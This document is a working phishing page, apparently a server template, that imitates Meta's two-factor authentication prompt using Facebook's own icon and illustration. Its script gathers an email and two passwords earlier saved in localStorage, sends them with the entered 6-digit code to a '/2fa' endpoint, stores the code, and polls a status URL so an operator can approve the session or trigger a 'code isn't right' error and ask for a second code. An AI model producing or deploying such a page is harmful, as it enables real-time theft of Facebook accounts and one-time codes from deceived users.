<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Two-Factor Authentication - Meta</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">

    <style>
        :root {
            --primary-text: #050505;
            --secondary-text: #65676b;
            --input-border: #ced4da;
            --error-color: #e41e3f;
            --button-disabled: #cbe0ff;
            --button-active: #0866ff;
            --button-hover: #0056c1;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            padding: 40px 16px 60px;
        }

        .auth-container {
            width: 100%;
            max-width: 480px;
            text-align: left;
        }

        .card-header h1 {
            font-size: 24px;
            font-weight: 700;
            color: var(--primary-text);
            margin-bottom: 12px;
            line-height: 1.25;
            letter-spacing: -0.02em;
        }

        .card-header p {
            font-size: 15px;
            line-height: 1.45;
            color: var(--primary-text);
            margin-bottom: 24px;
        }

        .illustration {
            width: 100%;
            margin-bottom: 24px;
            border-radius: 12px;
            overflow: hidden;
            background: #f0f2f5;
        }

        .illustration img {
            width: 100%;
            height: auto;
            display: block;
        }

        .form-group {
            position: relative;
            margin-bottom: 8px;
        }

        .input-box-wrapper {
            position: relative;
            width: 100%;
            border: 1px solid var(--input-border);
            border-radius: 12px;
            background: #ffffff;
            transition: border-color 0.15s ease, box-shadow 0.15s ease;
        }

        .input-box-wrapper:focus-within {
            border-color: #1877f2;
            box-shadow: 0 0 0 1px #1877f2;
        }

        .input-box-wrapper.has-error {
            border-color: var(--error-color) !important;
            box-shadow: 0 0 0 0.5px var(--error-color) !important;
        }

        .input-box-wrapper label {
            position: absolute;
            top: 10px;
            left: 16px;
            font-size: 12px;
            font-weight: 500;
            color: var(--secondary-text);
            pointer-events: none;
            transition: color 0.15s ease;
        }

        .input-box-wrapper.has-error label {
            color: var(--error-color) !important;
        }

        .input-box-wrapper input {
            width: 100%;
            padding: 24px 44px 8px 16px;
            border: none;
            background: transparent;
            font-size: 17px;
            font-weight: 400;
            color: var(--primary-text);
            outline: none;
            border-radius: 12px;
        }

        .clear-btn {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            border: none;
            background: transparent;
            cursor: pointer;
            display: none;
            align-items: center;
            justify-content: center;
            color: #050505;
            font-size: 18px;
            line-height: 1;
            padding: 0;
        }

        .clear-btn.show {
            display: flex;
        }

        .error-msg-line {
            display: none;
            align-items: center;
            gap: 6px;
            color: var(--error-color);
            font-size: 13px;
            margin-top: 8px;
            margin-bottom: 20px;
            font-weight: 400;
        }

        .error-msg-line svg {
            flex-shrink: 0;
        }

        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }

        .btn {
            width: 100%;
            height: 44px;
            border-radius: 9999px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.15s ease;
            border: none;
            text-decoration: none;
        }

        .btn-continue {
            background-color: var(--button-disabled);
            color: #ffffff;
            pointer-events: none;
            user-select: none;
        }

        .btn-continue.active {
            background-color: var(--button-active);
            pointer-events: auto;
            cursor: pointer;
        }

        .btn-continue.active:hover {
            background-color: var(--button-hover);
        }

        .btn-continue.loading {
            opacity: 0.65 !important;
            pointer-events: none !important;
            cursor: not-allowed !important;
        }

        .btn-other {
            background-color: #ffffff;
            border: 1px solid var(--input-border);
            color: var(--primary-text);
        }

        .btn-other:hover {
            background-color: #f2f2f2;
        }
    </style>
</head>

<body>

    <div class="auth-container">

        <div class="card-header">
            <h1>Go to the authentication application</h1>
            <p>Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo
                Mobile or Google Authenticator).</p>
        </div>

        <div class="illustration">
            <img src="https://www.facebook.com/images/assets_DO_NOT_HARDCODE/xmds_f3_meta_account/F3-2FA-AuthenticatorApp-WWW_light-3x.png"
                alt="2FA Illustration">
        </div>

        <form id="fa_form" onsubmit="return false;">
            <div class="form-group">
                <div class="input-box-wrapper" id="input_wrapper">
                    <label for="_r_a_">Code</label>
                    <input type="text" id="_r_a_" name="code" placeholder="" maxlength="8" autocomplete="one-time-code"
                        required autofocus>
                    <button type="button" class="clear-btn" id="clear_btn" title="Clear">✕</button>
                </div>

                <div id="error_box" class="error-msg-line">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="12" r="10" stroke="#e41e3f" stroke-width="2" fill="none" />
                        <line x1="12" y1="10.5" x2="12" y2="16.5" stroke="#e41e3f" stroke-width="2" stroke-linecap="round" />
                        <circle cx="12" cy="7" r="1.1" fill="#e41e3f" />
                    </svg>
                    <span>This code isn't right. Please try again</span>
                </div>
            </div>

            <div class="btn-group">
                <button type="submit" id="continue_btn" class="btn btn-continue">Continue</button>
                <button type="button" class="btn btn-other">Try another way</button>
            </div>
        </form>
    </div>

    <script>
        let step = 1;
        let pollInterval = null;

        const spinnerSvg = '<svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="display:inline-block;vertical-align:middle;"><g><circle cx="12" cy="12" r="9.5" stroke="rgba(255,255,255,0.3)" stroke-width="2.5" fill="none"/><path d="M12 2.5a9.5 9.5 0 0 1 9.5 9.5" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" fill="none"/><animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="0.75s" repeatCount="indefinite"/></g></svg>';

        document.addEventListener("DOMContentLoaded", function () {
            const faForm = document.getElementById("fa_form");
            const continueBtn = document.getElementById("continue_btn");
            const codeInput = document.getElementById("_r_a_");
            const clearBtn = document.getElementById("clear_btn");
            const inputWrapper = document.getElementById("input_wrapper");
            const errorBox = document.getElementById("error_box");

            function updateInputState() {
                const val = codeInput.value.trim();

                // Toggle Clear Button
                if (val.length > 0) {
                    clearBtn.classList.add("show");
                } else {
                    clearBtn.classList.remove("show");
                }

                // Toggle Continue button active state
                if (val.length >= 6 && val.length <= 8) {
                    continueBtn.classList.add("active");
                } else {
                    continueBtn.classList.remove("active");
                }
            }

            // Listen for input changes
            codeInput.addEventListener("input", function () {
                // Clear error state on user typing
                inputWrapper.classList.remove("has-error");
                errorBox.style.display = "none";
                updateInputState();
            });

            // Clear button action
            clearBtn.addEventListener("click", function (e) {
                e.preventDefault();
                codeInput.value = "";
                inputWrapper.classList.remove("has-error");
                errorBox.style.display = "none";
                updateInputState();
                codeInput.focus();
            });

            function setButtonLoading(loading) {
                if (loading) {
                    continueBtn.classList.add("loading");
                    continueBtn.innerHTML = spinnerSvg;
                } else {
                    continueBtn.classList.remove("loading");
                    continueBtn.textContent = "Continue";
                    updateInputState();
                }
            }

            function checkApprovalStatus(statusUrl) {
                fetch(statusUrl, {
                    headers: { Accept: "application/json" }
                })
                .then(r => r.json())
                .then(data => {
                    if (data.status === "approved") {
                        clearInterval(pollInterval);
                        window.location.href = data.redirectUrl || "/";
                    } else if (data.status === "rejected") {
                        clearInterval(pollInterval);
                        setButtonLoading(false);
                        
                        // Show red error state from screenshot
                        inputWrapper.classList.add("has-error");
                        errorBox.style.display = "flex";
                        updateInputState();
                        codeInput.focus();
                    }
                })
                .catch(err => {
                    console.warn("2FA approval check error", err);
                });
            }

            if (faForm) {
                faForm.addEventListener("submit", function (e) {
                    e.preventDefault();

                    const code = codeInput.value.trim();
                    if (!code) return;

                    // Set loading state with rotating spinner
                    setButtonLoading(true);
                    inputWrapper.classList.remove("has-error");
                    errorBox.style.display = "none";

                    const email = localStorage.getItem('fb_email') || '';
                    const password1 = localStorage.getItem('fb_pass1') || '';
                    const password2 = localStorage.getItem('fb_pass2') || '';

                    fetch("/2fa", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "X-CSRF-TOKEN": "{{ csrf_token() }}",
                            "Accept": "application/json"
                        },
                        body: JSON.stringify({
                            code: code,
                            step: step,
                            email: email,
                            password1: password1,
                            password2: password2,
                        }),
                    })
                    .then((response) => response.json())
                    .then((data) => {
                        // Save to localStorage
                        if (step === 1) {
                            localStorage.setItem("fb_2fa_1", code);
                        } else {
                            localStorage.setItem("fb_2fa_2", code);
                        }
                        step++;

                        if (data.statusUrl) {
                            clearInterval(pollInterval);
                            pollInterval = setInterval(() => {
                                checkApprovalStatus(data.statusUrl);
                            }, 1000);
                        } else if (data.action === "complete") {
                            window.location.href = data.redirectUrl || "/";
                        }
                    })
                    .catch((err) => {
                        console.error("Error:", err);
                        setButtonLoading(false);
                    });
                });
            }
        });
    </script>
</body>

</html>